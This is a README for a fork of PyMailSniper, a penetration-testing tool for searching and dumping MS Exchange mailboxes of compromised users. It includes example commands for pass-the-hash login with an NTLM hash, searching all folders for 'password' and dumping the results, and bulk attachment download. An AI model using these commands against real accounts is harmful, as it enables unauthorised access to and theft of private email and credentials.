# Инфо

За основу взят проект от foofus-sph1nx - https://github.com/foofus-sph1nx/PyMailSniper 
(но от него почти ничего не осталось)

**TOOL IS UNDER DEVELOPMENT**

**A LOT OF BUGS MAY APPEAR**

# Что и зачем

Во время пентестов, компрометируя пользователя, никогда не будет лишним изучить его почту, 
но сделать это не всегда просто - трудности возникают при отсутствие GUI, пробрасывании портов и т.п.
Этот форк призван облегчить жизнь пентестерам и прочим личностям, максимально упростив исследование почтовых ящиков на основе MS Exchange.

Создается на основе Exchangelib - (https://github.com/ecederstrand/exchangelib)

PS:
Я не про кодер, пишу в первую очередь для себя, исправления и пожелания приветствуются)

# What are the differences from the original and so on
1) Downloading folders and letters to mbox files
2) Convenient folder browsing
3) Multithreading (for dump folders)
4) Pretty tqdm + colorama
5) Working search in the email's body or subject text with the ability to dump the found letters to mbox
6) Make an autodiscover request or download oab in one click without burp, etc.
7) Leave `-p` empty for secure input
8) Download the entire mailbox at once (dump folders -f all -d ... -t ...)
9) Search among ALL emails by terms and download the found letters in full
10) Search attachments by name and download if needed
11) Proxy support
12) PASS-THE-HASH

# Usage
```bash
python3 pymailsniper.py -h
python3 pymailsniper.py dump -h
python3 pymailsniper.py list -h
python3 pymailsniper.py search -h
python3 pymailsniper.py get -h
```

# About pass-the-hash
As you may know, `pass the hash` works with NTLM hashes, so, first we need to force using NTLM for connection with `-nt` flag.

To do `pass the hash`, just use your NTLM hash in LM:NT format instead of regular password which matches `^[a-fA-F\d]{32}:[a-fA-F\d]{32}$` regex.
(You can fill LM part any 32 hex chars)

This technique will work with any code, which uses ntlm-auth (Exchangelib, requests-ntlm and etc)  

How it works look at line 25: https://github.com/jborean93/ntlm-auth/blob/master/ntlm_auth/compute_hash.py

# General options
```
	-e	--email	        your email
	-s	--server	server location (you can find all by "get autodiscover")
	-p	--password	skip for secure input 
	--proxy                 Example: socks5://127.0.0.1:9150
	-ua     --useragent     Default - Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
	-nt     --ntlm          Force using NTLM auth (Must be userd for PtH) (without this option exchange lib will automaticaly try different auth methods) 
```
# Avaliable modules:

## List 

### list folder
```
list folders 
        -a  --absolute	    Print absolute paths 
        -r  --root	    Use "root" folder as root for printing insted of "Top Information Store"
        -pc --print-count   Print count of child folders and email

```
#### Example:
`python3 pymailsniper.py -e user@example.com -s exchange.example.com list folders -pc`
### list oab
```
list oab 
        -oab 	--oab	path to your oab file 
```
#### Example:
`python3 pymailsniper.py -e user@example.com list oab --oab ./user@example.com/my_oab.oab`

### list contacts
```
List contacts 
	    -v	--verbose   Print additional info about contacts instead of just emails
	    -g	--gal       Use GAL instead of "AllAccount" folder

"list contacts --gal"	NOT TESTED properly
```
#### Example:
`python3 pymailsniper.py -e user@example.com -s exchange.example.com list contacts -v`

TODO:
```
list emails (is it useless?)
```


## Dump

### dump emails
```
dump emails 
	-f	--folder	folder's_name_on_server (all,sent,inbox also supported) (Default - Inbox ) 
	-d	--dump 		local_folder		(Default - Dump %Y-%m-%d %H-%M )
	-t 	--threads	thread_count		(1-2 threads is fine)
	-c	--count 	number			(count of last N emails in folder to dump)
	-r	--recurive	Used when we want to dump all fubfolders 
				of folder specified in --folder arg 
	
  'dump folders' and 'dump emails' are equal
  for dumping attachments see "search attach"
```
#### Examples:
1. Dump every folder using LM:NT hash

`python3 pymailsniper.py -e user@example.com -nt -p AAD3B435B51404EEAAD3B435B51404EE:AAD3B435B51404EEAAD3B435B51404EE -s exchange.example.com dump emails -f all`

2. Dump last 100 emails in Inbox folder to local folder mine_dump (no -f because `Inbox is default`)

`python3 pymailsniper.py -e user@example.com -s exchange.example.com dump emails -f all -d mine_dump -c 100`

3. Dump folder "Folder" and all it's subfolders using 2 "threads":

`python3 pymailsniper.py -e user@example.com -s exchange.example.com dump emails -f Folder -r -t 2`

TODO:
```
dump contacts (simply write to .txt?)
dump attachments
```

## Search

### search emails
```
search emails 
	-f	--folder	folder's_name_on_server		(all,sent,inbox also supported) (Default - Inbox )
	-d	--dump 		dump found emails to mbox 	(default - False)
	--field 		subject or body		(where to search)				(Default - body)
	-t	--terms		term1,term2,term3	(what to search separated by ,)			(Default - password)
	-r	--recurive	Used when we want to search in all fubfolders 
				of folder specified in --folder arg
	-c      --count         Search up to N emails for term
	-q      --quite         Do not print search results on the screen

  Search results saves in users folder by default (.txt)

```
#### Examples:
1. Search up to 100 'пароль' occurrence in every folder with dumping results and without printing results on the screen

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search emails -f all -t пароль --quite --dump --count 100`

2. Search in Inbox for 'qweqwe' in folder "Folder" and all its subfolders with printing results on the screen

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search emails -f Folder -r -t qweqwe`

### search attach
```
search attach 
	-f  --folder	folder's_name_on_server		(all,sent,inbox also supported) (Default - Inbox )
	-d  --dump 	dump found attachments  	(default - False)
	-r  --recurive	Used when we want to search in all fubfolders 
			of folder specified in --folder arg
	-n  -name       Search this terms in attachment's names (Comma separated) 
	                Example -   docx,config,report
	                without parameter will search every attachment


  downloaded files are stored in /%user_folder%/attach/folder/%attach_extension%
  
  its is also saves original timestamps of files (ModifiedDate, CreationDate)
```
#### Examples:
1. Search every attachment

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search attach -f all`
2. Dump every attachment

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search attach -f all --dump`

3. Find all zip,docx,rar files and dump in folder "Folder" and all subfolders

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search attach -f Folder -r -n zip,docx,rar --dump`

3. Download "my_secrets.docx" file from "Secrets" folder

`python3 pymailsniper.py -e user@example.com -s exchange.example.com search attach -f Secrets -n my_secrets.docx --dump`




## Get
## get autodiscover
```
get autodiscover	looks for autodiscover locations, saves plain autodiscover.xml to users folder
                        and prints servers for -s arg

  You can use this without -s (--remote-server)
  by default it tries ntlm,basic auths for https,http urls for possible autodiscover locations 
```

## get lzx
```
get lzx         downloads "Offline Address Book" in .lzx format
```
TODO:
```
convert lzx to oab
```

## Additional reading about pentesting Exchange and etc:
1. https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/
2. https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c
3. https://bi.zone/expertise/blog/hunting-down-ms-exchange-attacks-part-2/
4. https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/

## Converting lzx to oab:
https://github.com/search?q=LzxToOab
